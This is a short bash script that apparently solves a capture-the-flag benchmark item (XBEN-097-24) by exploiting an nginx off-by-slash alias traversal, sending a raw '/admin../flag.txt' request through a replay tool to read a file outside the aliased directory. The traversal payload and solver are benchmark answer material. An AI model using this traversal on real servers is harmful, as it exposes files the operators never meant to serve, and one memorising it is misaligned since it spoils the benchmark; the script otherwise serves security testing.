#!/usr/bin/env bash
# XBEN-097-24 — nginx off-by-slash alias traversal. Proxy-mode twin. A
# `location /admin` mapped with `alias` and no trailing slash lets `/admin../`
# escape the aliased directory, so `/admin../flag.txt` reads the flag outside it.
# Sent with --raw-target so the `..` is not normalised away by the client.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
TARGET="${2:-/admin../flag.txt}"
SESSION="xben097p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --session "$SESSION" --raw-target "$TARGET" --no-follow >/dev/null
print_flag
